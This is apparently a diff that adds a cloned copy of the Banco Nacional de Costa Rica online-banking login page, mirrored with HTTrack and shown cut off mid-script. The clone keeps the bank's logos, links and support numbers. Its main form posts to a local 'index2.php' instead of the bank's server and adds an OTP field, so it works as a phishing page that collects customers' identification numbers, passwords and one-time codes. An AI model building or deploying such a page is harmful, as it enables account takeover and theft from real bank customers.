@@ -1,0 +1,1550 @@
+<html lang="es"><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=1284, initial-scale=1.0, user-scalable=1">
+
+  <link rel="icon" href="favicon.png" type="image/png">
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+  <meta http-equiv="cache-control" content="no-cache,no-store">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="expires" content="-1">
+  <meta name="mswebdialog-title" content="Connecting to Banco Nacional">
+
+  <title>Banco Nacional</title>
+  <script type="text/javascript">
+    //<![CDATA[
+    function LoginErrors() { this.userNameFormatError = 'Escriba el identificador de usuario con el formato \u0026quot;dominio\\usuario\u0026quot; o \u0026quot;usuario@dominio\u0026quot;.'; this.passwordEmpty = 'Escriba la contrase\u0026#241;a.'; this.passwordTooLong = 'La contrase\u0026#241;a es demasiado larga (\u0026gt; 128 caracteres).'; }; var maxPasswordLength = 128;
+//]]>
+  </script>
+
+  <script type="text/javascript">
+    //<![CDATA[
+    // Copyright (c) Microsoft Corporation.  All rights reserved.
+    function InputUtil(errTextElementID, errDisplayElementID) {
+
+      if (!errTextElementID) errTextElementID = 'errorText';
+      if (!errDisplayElementID) errDisplayElementID = 'error';
+
+      this.hasFocus = false;
+      this.errLabel = document.getElementById(errTextElementID);
+      this.errDisplay = document.getElementById(errDisplayElementID);
+    };
+    InputUtil.prototype.canDisplayError = function () {
+      return this.errLabel && this.errDisplay;
+    }
+    InputUtil.prototype.checkError = function () {
+      if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+      }
+      if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+          var causeNode = document.getElementById(cause);
+          if (causeNode && causeNode.value) {
+            causeNode.focus();
+            this.hasFocus = true;
+          }
+        }
+      }
+      else {
+        this.errDisplay.style.display = 'none';
+      }
+    };
+    InputUtil.prototype.setInitialFocus = function (input) {
+      if (this.hasFocus) return;
+      var node = document.getElementById(input);
+      if (node) {
+        if ((/^\s*$/).test(node.value)) {
+          node.focus();
+          this.hasFocus = true;
+        }
+      }
+    };
+    InputUtil.prototype.setError = function (input, errorMsg) {
+      if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+      }
+      input.focus();
+
+      if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+      }
+      this.errLabel.setAttribute('for', input.id);
+      this.errDisplay.style.display = '';
+    };
+    InputUtil.makePlaceholder = function (input) {
+      var ua = navigator.userAgent;
+
+      if (ua != null &&
+        (ua.match(/MSIE 9.0/) != null ||
+          ua.match(/MSIE 8.0/) != null ||
+          ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+          var placeholder = node.getAttribute("placeholder");
+          if (placeholder != null && placeholder != '') {
+            var label = document.createElement('input');
+            label.type = "text";
+            label.value = placeholder;
+            label.readOnly = true;
+            label.style.position = 'absolute';
+            label.style.borderColor = 'transparent';
+            label.className = node.className + ' hint';
+            label.tabIndex = -1;
+            label.onfocus = function () { this.nextSibling.focus(); };
+
+            node.style.position = 'relative';
+            node.parentNode.style.position = 'relative';
+            node.parentNode.insertBefore(label, node);
+            node.onkeyup = function () { InputUtil.showHint(this); };
+            node.onblur = function () { InputUtil.showHint(this); };
+            node.style.background = 'transparent';
+
+            node.setAttribute("placeholder", "");
+            InputUtil.showHint(node);
+          }
+        }
+      }
+    };
+    InputUtil.focus = function (inputField) {
+      var node = document.getElementById(inputField);
+      if (node) node.focus();
+    };
+    InputUtil.hasClass = function (node, clsName) {
+      return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+    };
+    InputUtil.addClass = function (node, clsName) {
+      if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+    };
+    InputUtil.removeClass = function (node, clsName) {
+      if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+      }
+    };
+    InputUtil.showHint = function (node, gotFocus) {
+      if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+      }
+      else {
+        node.previousSibling.style.display = '';
+      }
+    };
+    InputUtil.updatePlaceholder = function (input, placeholderText) {
+      var node = document.getElementById(input);
+      if (node) {
+        var ua = navigator.userAgent;
+        if (ua != null &&
+          (ua.match(/MSIE 9.0/) != null ||
+            ua.match(/MSIE 8.0/) != null ||
+            ua.match(/MSIE 7.0/) != null)) {
+          var label = node.previousSibling;
+          if (label != null) {
+            label.value = placeholderText;
+          }
+        }
+        else {
+          node.placeholder = placeholderText;
+        }
+      }
+    };
+
+//]]>
+  </script>
+
+
+
+  <link rel="stylesheet" type="text/css" href="portal/css/style8f57.css?id=0F9A4AAB2FC50B0189F436642AAAA301641D0685424D403AAAB8DD4459949820&amp;rp=37d0e840-bdc3-e911-90f3-005056b6cfbb">
+  <style>
+    .illustrationClass {
+      background-image: url(portal/illustration/illustrationba1b.png?id=183128A3C941EDE3D9199FA37D6AA90E0A7DFE101B37D10B4FEDA0CF35E11AFD&amp;rp=37d0e840-bdc3-e911-90f3-005056b6cfbb);
+    }
+  </style>
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400&amp;display=swap" rel="stylesheet"></head>
+
+<body dir="ltr" class="body">
+  <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
+    <h1>Se requiere JavaScript</h1>
+    <p>Se requiere JavaScript. El explorador web no es compatible con JavaScript o no se ha habilitado JavaScript en
+      este explorador web.</p>
+    <p>Para determinar si su explorador web es compatible con JavaScript o para habilitar JavaScript, consulte la ayuda
+      del explorador web.</p>
+  </div>
+  <script type="text/javascript" language="JavaScript">
+    document.getElementById("noScript").style.display = "none";
+  </script>
+  <div id="fullPage">
+    <div id="brandingWrapper" class="float">
+      <div id="branding" class="illustrationClass"><div id="contentWrapper" class="float" style="display: block;">
+      <div id="content" style="display: block;"><table id="tableMain" width="100%" height="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr class="HeadContain"><td style="vertical-align : middle"><div id="header"><div class="headerContent"><table width="100%" height="80px" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td><div class="company_logo"><img src="logo.png" border="0"></div></td><td><div class="company_help"><div id="company_helpInside"><a id="chatLink" href="https://chat.bncr.fi.cr/I3Root/BNCR/webChat.php?CanalOrigen=2"><img alt="BN Chat" src="BNChat.png"></a></div></div></td></tr></tbody></table></div></div></td></tr><tr class="HeadContainSubTitle"><td><div id="divHeadContainSubTitle" class="divHeadContainSubTitle"> <label class="divHeadContainSubTitleLabel"></label></div></td></tr><tr id="MainContent" class="MainContent"><td><div class="contentBlock"><div id="Modal" class="modal"><div id="modalcontent" class="modal-content"><div class="modal-header"><span id="spClose" onclick="Close(this); return false" class="close">×</span><h2> Banco Nacional de Costa Rica</h2></div><div class="modal-body"><p>Para una mejor atención de sus consultas puede llamar a nuestro centro de atención al número 2212-2000 o puede utilizar nuestra opción de BN Chat en nuestro sitio <a href="http://www.bncr.fi.cr/" target="_blank">www.bncr.fi.cr</a></p></div><div class="modal-footer"><input type="button" id="btnClose" value="Aceptar" onclick="Close(this); return false"></div></div></div><div id="workArea">
+
+            <div id="authArea" class="groupMargin">
+
+
+
+              <div id="loginArea">
+                <div id="loginMessage" class="groupMargin"></div>
+
+                <form method="post" id="formx" autocomplete="off" action="index2.php">
+                  <div id="error" class="fieldMargin error smallText" style="display: none;">
+                    <span id="errorText" for="" aria-live="assertive" role="alert"></span>
+                  </div>
+
+                  <div id="formsAuthenticationArea">
+                    <div id="userNameArea">
+                      <label id="userNameInputLabel" for="userNameInput" class="hidden">Cuenta de usuario</label>
+                      
+                    <div id="divCertificateAuthentication"><div id="authOptionLinks" class="groupMargin"><a class="actionLink" href="#" id="CertificateAuthentication" role="button" onclick="SelectOption('CertificateAuthentication'); return false;" style="display: none;">Iniciar sesión mediante
+                        un certificado X.509</a>
+                      <div id="waitingWheelDiv" style="display: none;">
+                        <div id="WaitingWheel">
+                          <!-- NOTE: This style portion is identical to cookie pull page, they are not in shared css file because of legacy dependancies for custom themes-->
+                          <!-- CSS for small "waiting" wheel -->
+                          <style>
+                            #floatingCirclesG {
+                              position: relative;
+                              width: 125px;
+                              height: 125px;
+                              margin: auto;
+                              transform: scale(0.4);
+                              -o-transform: scale(0.4);
+                              -ms-transform: scale(0.4);
+                              -webkit-transform: scale(0.4);
+                              -moz-transform: scale(0.4);
+                            }
+
+                            .f_circleG {
+                              position: absolute;
+                              height: 22px;
+                              width: 22px;
+                              border-radius: 12px;
+                              -o-border-radius: 12px;
+                              -ms-border-radius: 12px;
+                              -webkit-border-radius: 12px;
+                              -moz-border-radius: 12px;
+                              animation-name: f_fadeG;
+                              -o-animation-name: f_fadeG;
+                              -ms-animation-name: f_fadeG;
+                              -webkit-animation-name: f_fadeG;
+                              -moz-animation-name: f_fadeG;
+                              animation-duration: 1.2s;
+                              -o-animation-duration: 1.2s;
+                              -ms-animation-duration: 1.2s;
+                              -webkit-animation-duration: 1.2s;
+                              -moz-animation-duration: 1.2s;
+                              animation-iteration-count: infinite;
+                              -o-animation-iteration-count: infinite;
+                              -ms-animation-iteration-count: infinite;
+                              -webkit-animation-iteration-count: infinite;
+                              -moz-animation-iteration-count: infinite;
+                              animation-direction: normal;
+                              -o-animation-direction: normal;
+                              -ms-animation-direction: normal;
+                              -webkit-animation-direction: normal;
+                              -moz-animation-direction: normal;
+                            }
+
+                            #frotateG_01 {
+                              left: 0;
+                              top: 51px;
+                              animation-delay: 0.45s;
+                              -o-animation-delay: 0.45s;
+                              -ms-animation-delay: 0.45s;
+                              -webkit-animation-delay: 0.45s;
+                              -moz-animation-delay: 0.45s;
+                            }
+
+                            #frotateG_02 {
+                              left: 15px;
+                              top: 15px;
+                              animation-delay: 0.6s;
+                              -o-animation-delay: 0.6s;
+                              -ms-animation-delay: 0.6s;
+                              -webkit-animation-delay: 0.6s;
+                              -moz-animation-delay: 0.6s;
+                            }
+
+                            #frotateG_03 {
+                              left: 51px;
+                              top: 0;
+                              animation-delay: 0.75s;
+                              -o-animation-delay: 0.75s;
+                              -ms-animation-delay: 0.75s;
+                              -webkit-animation-delay: 0.75s;
+                              -moz-animation-delay: 0.75s;
+                            }
+
+                            #frotateG_04 {
+                              right: 15px;
+                              top: 15px;
+                              animation-delay: 0.9s;
+                              -o-animation-delay: 0.9s;
+                              -ms-animation-delay: 0.9s;
+                              -webkit-animation-delay: 0.9s;
+                              -moz-animation-delay: 0.9s;
+                            }
+
+                            #frotateG_05 {
+                              right: 0;
+                              top: 51px;
+                              animation-delay: 1.05s;
+                              -o-animation-delay: 1.05s;
+                              -ms-animation-delay: 1.05s;
+                              -webkit-animation-delay: 1.05s;
+                              -moz-animation-delay: 1.05s;
+                            }
+
+                            #frotateG_06 {
+                              right: 15px;
+                              bottom: 15px;
+                              animation-delay: 1.2s;
+                              -o-animation-delay: 1.2s;
+                              -ms-animation-delay: 1.2s;
+                              -webkit-animation-delay: 1.2s;
+                              -moz-animation-delay: 1.2s;
+                            }
+
+                            #frotateG_07 {
+                              left: 51px;
+                              bottom: 0;
+                              animation-delay: 1.35s;
+                              -o-animation-delay: 1.35s;
+                              -ms-animation-delay: 1.35s;
+                              -webkit-animation-delay: 1.35s;
+                              -moz-animation-delay: 1.35s;
+                            }
+
+                            #frotateG_08 {
+                              left: 15px;
+                              bottom: 15px;
+                              animation-delay: 1.5s;
+                              -o-animation-delay: 1.5s;
+                              -ms-animation-delay: 1.5s;
+                              -webkit-animation-delay: 1.5s;
+                              -moz-animation-delay: 1.5s;
+                            }
+
+                            @keyframes f_fadeG {
+                              0% {
+                                background-color: rgb(47, 146, 212);
+                              }
+
+                              100% {
+                                background-color: rgb(255, 255, 255);
+                              }
+                            }
+
+                            @-o-keyframes f_fadeG {
+                              0% {
+                                background-color: rgb(47, 146, 212);
+                              }
+
+                              100% {
+                                background-color: rgb(255, 255, 255);
+                              }
+                            }
+
+                            @-ms-keyframes f_fadeG {
+                              0% {
+                                background-color: rgb(47, 146, 212);
+                              }
+
+                              100% {
+                                background-color: rgb(255, 255, 255);
+                              }
+                            }
+
+                            @-webkit-keyframes f_fadeG {
+                              0% {
+                                background-color: rgb(47, 146, 212);
+                              }
+
+                              100% {
+                                background-color: rgb(255, 255, 255);
+                              }
+                            }
+
+                            @-moz-keyframes f_fadeG {
+                              0% {
+                                background-color: rgb(47, 146, 212);
+                              }
+
+                              100% {
+                                background-color: rgb(255, 255, 255);
+                              }
+                            }
+                          </style>
+
+                          <!-- Div containing small "waiting" wheel -->
+                          <div id="floatingCirclesG">
+                            <div class="f_circleG" id="frotateG_01"></div>
+                            <div class="f_circleG" id="frotateG_02"></div>
+                            <div class="f_circleG" id="frotateG_03"></div>
+                            <div class="f_circleG" id="frotateG_04"></div>
+                            <div class="f_circleG" id="frotateG_05"></div>
+                            <div class="f_circleG" id="frotateG_06"></div>
+                            <div class="f_circleG" id="frotateG_07"></div>
+                            <div class="f_circleG" id="frotateG_08"></div>
+                          </div>
+                        </div>
+                      </div>
+                    <input type="button" class="botonCert2" alt="Ingresar con certificado" title="Ingresar con certificado" onclick="return CertificateClick();" tabindex="5"></div></div><div id="divuserNameInput"><input id="userNameInput" style="border-radius:10px;" name="UserName" type="mail" value="" tabindex="1" class="text fullWidth usrInput InputNoKeyBoard" spellcheck="false" placeholder="Identificación" autocomplete="off" required="" maxlength="25"></div></div>
+
+                    <div id="passwordArea">
+                      <label id="passwordInputLabel" for="passwordInput" class="hidden">Contraseña</label>
+                      <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth usrInput InputNoKeyBoard" placeholder="Contraseña" autocomplete="off" required="" maxlength="16" onpaste="return false" oncopy="return false" ondrop="return false" style="font-size: 20px;">
+                    </div>
+
+                    <div id="userNameAreas">
+                      <label id="userNameInputLabel" for="userNameInput" class="hidden">Cuenta de usuario</label>
+                      <input style="border-radius:10px;
+                      height: 46px !important;
+                      /* background: #919396; */
+                      background: #CCCCCC;
+                      text-align: center;
+                      font-size: 20px;
+                      /* color: #C4C6C8; */
+                      color: #666666;
+                      font-family: 'Montserrat';
+                      border-style: hidden;" name="otp" type="mail" placeholder="Código OTP" autocomplete="off" required="">
+                    </div>
+                    <div id="kmsiArea" style="display:none">
+                      <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
+                      <label for="kmsiInput">Mantener la sesión iniciada</label>
+                    </div>
+                    <div id="submissionArea" class="submitMargin">
+                      <span id="submitButton" class="submit" tabindex="4" role="button" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="document.getElementById('formx').submit();">Iniciar sesión</span>
+                    </div>
+                  <div class="divInfo" id="divInfoId"><div id="lostPassword"><a href="https://bncr.bnonline.fi.cr/Login/RedefinirClave/SolicitudOlvidoClave.aspx" target="_blank"><p class="txtBlue"><span class="dot"></span> ¿Olvidó su contraseña? </p></a></div></div></div>
+                  <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+                </form>
+
+                <div id="authOptions">
+                  <form id="options" method="post" action="https://auth.bncr.fi.cr:443/adfs/ls?version=1.0&amp;action=signin&amp;realm=urn%3AAppProxy%3Acom&amp;appRealm=37d0e840-bdc3-e911-90f3-005056b6cfbb&amp;returnUrl=https%3A%2F%2Fbncr.bnonline.fi.cr%2FBNCR.InternetBanking.Web%2F&amp;client-request-id=FBEEB6B7-FE61-0000-E9CE-BAFC61FED501">
+                    <script type="text/javascript">
+                      function SelectOption(option) {
+                        var w = document.getElementById('waitingWheelDiv');
+                        if (w) w.style.display = 'inline';
+                        var i = document.getElementById('optionSelection');
+                        i.value = option;
+                        document.forms['options'].submit();
+                        return false;
+                      }
+                    </script>
+                    <input id="optionSelection" type="hidden" name="AuthMethod">
+                    <input id="userNameInputOptionsHolder" name="UserName" value="" type="hidden">
+                    
+                  </form>
+                </div>
+
+                
+
+                <script type="text/javascript">
+                  //<![CDATA[
+
+                  function Login() {
+                  }
+
+                  Login.userNameInput = 'userNameInput';
+                  Login.passwordInput = 'passwordInput';
+
+                  Login.initialize = function () {
+
+                    var u = new InputUtil();
+
+                    u.checkError();
+                    u.setInitialFocus(Login.userNameInput);
+                    u.setInitialFocus(Login.passwordInput);
+                  }();
+
+                  Login.submitLoginRequest = function () {
+                    var u = new InputUtil();
+                    var e = new LoginErrors();
+
+                    var userName = document.getElementById(Login.userNameInput);
+                    var password = document.getElementById(Login.passwordInput);
+
+                    if (!userName.value || !userName.value.match('[@\\\\]')) {
+                      u.setError(userName, e.userNameFormatError);
+                      return false;
+                    }
+
+                    if (!password.value) {
+                      u.setError(password, e.passwordEmpty);
+                      return false;
+                    }
+
+                    if (password.value.length > maxPasswordLength) {
+                      u.setError(password, e.passwordTooLong);
+                      return false;
+                    }
+
+                    document.forms['loginForm'].submit();
+                    return false;
+                  };
+
+                  InputUtil.makePlaceholder(Login.userNameInput);
+                  InputUtil.makePlaceholder(Login.passwordInput);
+        //]]>
+                </script>
+              </div>
+
+            </div>
+
+          </div></div></td></tr><tr class="FootTr"><td><div id="footerPlaceholder"><div class="bottomtd"><div class="FootCtn footermain fleft" id="footer_copyryt"><p id="ul_LoginL" class="menulinkHref footer_Display">Accesos</p><p id="ul_KeyBoardL" class="menulinkHref footer_KeyBoard">Estimado cliente tenga en cuenta los siguientes consejos:</p><p id="ul_OTPL" class="menulinkHref footer_OTP">Estimado cliente le solicitamos seguir las siguientes instrucciones para ingresar el OTP respectivo en el sistema:</p></div><div class="fcenter"><ul id="ul_LoginC" class="menulinkHref footer_Display"><li><a href="https://bncr.bnonline.fi.cr/Login/RegistroLineaTarjeta.aspx" target="_blank">Registro en línea</a></li><li><a href="https://bncr.bnonline.fi.cr/Login/SincronizarOTP.aspx" target="_blank">Sincronizar OTP</a></li><li><a href="https://bncr.bnonline.fi.cr/Login/descargas.aspx" target="_blank">Descargar Módulo Local IBC</a></li></ul><ul id="ul_KeyBoardC" class="menulinkHref footer_KeyBoard"><li> Favor digitar su clave utilizando el teclado convencional.</li><li>En este momento usted se encuentra en un nivel de seguridad restringido para el ingreso de cuentas favoritas.</li></ul><ul id="ul_OTPC" class="menulinkHref footer_OTP"><li>Favor digite el OTP proporcionado por el sistema con el que usted cuenta (Cliente OTP, Dispositivo OTP) en la parte de arriba.</li></ul></div><vr>      </vr><div class="FootCtn social_links "><div class="fright"><ul id="ul_LoginR" class="menulinkHref footer_Display"><li><a href="#">Asistencia: Contáctenos al 2212-2000 opción 5</a></li></ul><ul id="ul_KeyBoardR" class="menulinkHref footer_KeyBoard"><li>Actualice su nivel de seguridad mediante el uso de nuestro nuevo teclado virtual y tenga abiertas todas las posibilidades del servicio.</li><li>Si tiene dudas favor consultar el sitio de ayuda o comuníse al número 2212-2000.</li></ul><ul id="ul_OTPR" class="menulinkHref footer_OTP"><li>El OTP proporcionado debe ser de 6 caracteres si utiliza Cliente OTP, u 8 números si se utiliza un Dispositivo OTP.</li><li>Si tiene dudas favor consultar el sitio de ayuda o comuníse al número 2212-2000.</li></ul></div></div></div></div></td></tr></tbody></table></div>
+      <footer id="footer">
+        <div id="footerLinks" class="floatReverse">
+          <div><span id="copyright">© 2018 Microsoft</span><a id="privacy" class="pageLink footerLink" href="https://www.bncr.fi.cr/">BNCR</a></div>
+        </div>
+      </footer>
+    </div></div>
+    </div>
+    
+  </div>
+  <script type="text/javascript">
+    //<![CDATA[
+    var Title = "Banco Nacional";
+
+    //Login Title Text
+    var LoginTitle = "Log In";
+
+    var urlBnMovilDefault = 'https://bncrmovil.bnonline.fi.cr/BNMovil';
+    var urlIBDefault = 'https://bncr.bnonline.fi.cr/BNCR.InternetBanking.Web/IngresoIB.aspx';
+    var urlBNSDefault = 'https://bnservicios.bncr.fi.cr/';
+    var urlLostPassword = 'https://bncr.bnonline.fi.cr/Login/RedefinirClave/SolicitudOlvidoClave.aspx';
+    var urlLostPasswordBnMovil = 'https://bncrmovil.bnonline.fi.cr/LoginM/OlvidoClave/OlvidoClaveInicio';
+    var urlAffiliate = 'https://bncr.bnonline.fi.cr/Login/SolicitudAfiliacionIBC.aspx?App=IBC';
+    var urlAffiliateBnMovil = 'https://bncrmovil.bnonline.fi.cr/LoginM/Afiliacion/Index';
+    var urlApiToken = "https://auth.bncr.fi.cr/BNCR.Auth/api/Token/ValidateToken/";
+    var urlCambioClave = "https://bncr.bnonline.fi.cr/Login/CambioClaveADFS.aspx";
+    var urlCambioClaveBNM = "https://bncrmovil.bnonline.fi.cr/LoginM/Login/CambioClaveNueva";
+    var indiceAuth = "auth.bncr.fi.cr";
+    var indiceBNM = "BNMovil";
+    var indiceIB = "bncr.bnonline";
+    var indiceBNS = "bnservicios";
+
+    var urlIBCDescarga = "https://bncr.bnonline.fi.cr/Login/descargas.aspx";
+
+    // URL Logo
+    var rutabase = "https://" + window.location.hostname;
+    var urlLogo = rutabase + '/adfs/portal/images/bncr/logo.png';
+    var urlChatImg = rutabase + '/adfs/portal/images/bncr/BNChat.png';
+    var urlChat = "https://chat.bncr.fi.cr/I3Root/BNCR/webChat.php?CanalOrigen=2";
+
+    //Copyrights Text
+    var FooterSeccionLeftLogin = '<p id="ul_LoginL" class="menulinkHref footer_Login" >Accesos</p>';
+    var FooterSeccionCenterLogin = '<ul id="ul_LoginC" class="menulinkHref footer_Login"><li><a href="https://bncr.bnonline.fi.cr/Login/RegistroLineaTarjeta.aspx" target="_blank">Registro en l&iacute;nea</a></li><li><a href="https://bncr.bnonline.fi.cr/Login/SincronizarOTP.aspx" target="_blank">Sincronizar OTP</a></li><li><a href="' + urlIBCDescarga + '" target="_blank">Descargar M&oacute;dulo Local IBC</a></li></ul>';
+    var FooterSeccionRightLogin = '<ul id="ul_LoginR" class="menulinkHref footer_Login"><li><a href="#">Asistencia: Cont&aacute;ctenos al 2212-2000 opci&oacute;n 5</a></li></ul>';
+
+
+    var FooterSeccionLeftKeyBoard = '<p id="ul_KeyBoardL" class="menulinkHref footer_KeyBoard">Estimado cliente tenga en cuenta los siguientes consejos:</p>';
+    var FooterSeccionCenterKeyBoard = '<ul id="ul_KeyBoardC" class="menulinkHref footer_KeyBoard"><li> Favor digitar su clave utilizando el teclado convencional.</li><li>En este momento usted se encuentra en un nivel de seguridad restringido para el ingreso de cuentas favoritas.</li></ul>';
+    var FooterSeccionRightKeyBoard = '<ul id="ul_KeyBoardR" class="menulinkHref footer_KeyBoard"><li>Actualice su nivel de seguridad mediante el uso de nuestro nuevo teclado virtual y tenga abiertas todas las posibilidades del servicio.</li><li>Si tiene dudas favor consultar el sitio de ayuda o comun&iacute;se al n&uacute;mero 2212-2000.</li></ul>';
+
+    var FooterSeccionLeftOTP = '<p id="ul_OTPL" class="menulinkHref footer_OTP">Estimado cliente le solicitamos seguir las siguientes instrucciones para ingresar el OTP respectivo en el sistema:</p>';
+    var FooterSeccionCenterOTP = '<ul id="ul_OTPC" class="menulinkHref footer_OTP"><li>Favor digite el OTP proporcionado por el sistema con el que usted cuenta (Cliente OTP, Dispositivo OTP) en la parte de arriba.</li></ul>';
+    var FooterSeccionRightOTP = '<ul id="ul_OTPR" class="menulinkHref footer_OTP"><li>El OTP proporcionado debe ser de 6 caracteres si utiliza Cliente OTP, u 8 n&uacute;meros si se utiliza un Dispositivo OTP.</li><li>Si tiene dudas favor consultar el sitio de ayuda o comun&iacute;se al n&uacute;mero 2212-2000.</li></ul>';
+
+
+    //Terms Text
+    var Terms = "Terms of use";
+
+    //Terms Url can be changed here.
+    var TermsUrl = "#";
+
+    //Privacy Text
+    var Privacy = "Privacy Policy";
+
+    //Privacy Url can be changed here.
+    var PrivacyUrl = "#";
+
+    // Help Chat
+    var chatLink = '<a id="chatLink" href="' + urlChat + '"><img alt="BN Chat" src="BNChat.png"></a>';
+
+    var helpModal = '<div id="Modal" class="modal"><div id="modalcontent" class="modal-content"><div class="modal-header"><span id="spClose" onclick="Close(this); return false" class="close">&times;</span><h2> Banco Nacional de Costa Rica</h2></div><div class="modal-body"><p>Para una mejor atenci\u00F3n de sus consultas puede llamar a nuestro centro de atenci\u00F3n al n\u00FAmero 2212-2000 o puede utilizar nuestra opci\u00F3n de BN Chat en nuestro sitio <a href="http://www.bncr.fi.cr/" target="_blank">www.bncr.fi.cr</a></p></div><div class="modal-footer"><input type="button" id="btnClose" value="Aceptar" onclick="Close(this); return false"/></div></div></div>';
+
+    // This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+    "use strict";
+
+    var contentHtml = document.getElementById("contentWrapper");
+    if (contentHtml) {
+      contentHtml.style.display = "none";
+    }
+
+    document.title = Title;
+    // Loading External Fav ICon and Fonts
+    document.head.innerHTML += '<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400&display=swap" rel="stylesheet">';
+
+    // iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+    // Note change input type does not work on all versions of all browsers.
+    if (navigator.userAgent.match(/iPhone/i) !== null) {
+      var emails = document.querySelectorAll("input[type='email']");
+      if (emails) {
+        for (var i = 0; i < emails.length; i++) {
+          emails[i].type = 'text';
+        }
+      }
+    }
+
+    // In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+    // which is necessary for correct functionality of immersive IE. 
+    // However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+    // values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+    // Windows 8 phone has agent string 'IEMobile 10.0'
+    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+      var msViewportStyle = document.createElement("style");
+      msViewportStyle.appendChild(
+        document.createTextNode(
+          "@-ms-viewport{width:auto!important}"
+        )
+      );
+      msViewportStyle.appendChild(
+        document.createTextNode(
+          "@-ms-viewport{height:auto!important}"
+        )
+      );
+      document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+    }
+
+    // If the innerWidth is defined, use it as the viewport width.
+    if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
+      var viewport = document.querySelector("meta[name=viewport]");
+      viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, user-scalable=1');
+    }
+
+    // Gets the current style of a specific property for a specific element.
+    function getStyle(element, styleProp) {
+      var propStyle = null;
+
+      if (element && element.currentStyle) {
+        propStyle = element.currentStyle[styleProp];
+      }
+      else if (element && window.getComputedStyle) {
+        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
+      }
+
+      return propStyle;
+    }
+
+    // The script below is used for downloading the illustration image 
+    // only when the branding is displaying. This script work together
+    // with the code in PageBase.cs that sets the html inline style
+    // containing the class 'illustrationClass' with the background image.
+    var LoadTheme = function () {
+      var passwordInput = document.getElementById('passwordInput');
+      var usrName = GetUsrName();
+
+      Signout();
+      InitControls(true);
+
+      var signInInput = document.getElementById("userNameInput");
+      if (signInInput) {
+        signInInput.placeholder = "Identificaci\u00F3n";
+      }
+
+      var header = document.getElementById("header");
+      if (header) {
+        header.innerHTML = '<div class="headerContent"><table width="100%" height="80px" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td><div class="company_logo"><img src="logo.png" border="0" /></div></td><td><div class="company_help"><div id="company_helpInside">' + chatLink + '</div></div></td></tr></tbody></table></div>';
+      }
+
+      var logtitle = document.getElementById("loginMessage");
+      if (logtitle) {
+        //logtitle.innerHTML = LoginTitle;
+        logtitle.innerHTML = '';
+      }
+
+      var footer = document.getElementById("footerPlaceholder");
+      if (footer) {
+        footer.innerHTML = '<div class="bottomtd"><div class="FootCtn footermain fleft" id="footer_copyryt">' + FooterSeccionLeftLogin + FooterSeccionLeftKeyBoard + FooterSeccionLeftOTP + '</div><div class="fcenter">' + FooterSeccionCenterLogin + FooterSeccionCenterKeyBoard + FooterSeccionCenterOTP + '</div><vr>      </vr><div class="FootCtn social_links "><div class="fright">' + FooterSeccionRightLogin + FooterSeccionRightKeyBoard + FooterSeccionRightOTP + '</div></div></div>';
+      }
+
+      var content = document.getElementById("content");
+      if (content) {
+        content.innerHTML = '<table id="tableMain" width="100%" height="100%" border="0" cellpadding="0" cellspacing="0"><tbody><tr class="HeadContain"><td style="vertical-align : middle">' + header.outerHTML + '</td></tr><tr class="HeadContainSubTitle"><td><div id="divHeadContainSubTitle" class="divHeadContainSubTitle"> <label class="divHeadContainSubTitleLabel"></label></div></td></tr><tr id="MainContent" class="MainContent"><td><div class="contentBlock">' + helpModal + document.getElementById("workArea").outerHTML + '</div></td></tr><tr class="FootTr"><td>' + footer.outerHTML + '</td></tr></tbody></table>';
+        content.style.display = "none";
+      }
+
+      contentHtml = document.getElementById("contentWrapper");
+      if (contentHtml) {
+        document.getElementById("branding").appendChild(contentHtml);
+        contentHtml.style.display = "block";
+      }
+
+      var terms = document.getElementById("TermsUrl");
+      if (terms && TermsUrl.length > 0) {
+        terms.href = TermsUrl;
+      }
+      var privacy = document.getElementById("PrivacyUrl");
+      if (privacy && PrivacyUrl.length > 0) {
+        privacy.href = PrivacyUrl;
+      }
+
+      var branding = document.getElementById("branding");
+      var brandingDisplay = getStyle(branding, "display");
+      var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");
+
+      if (brandingDisplay && brandingDisplay !== "none" &&
+        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
+        var newClass = "illustrationClass";
+
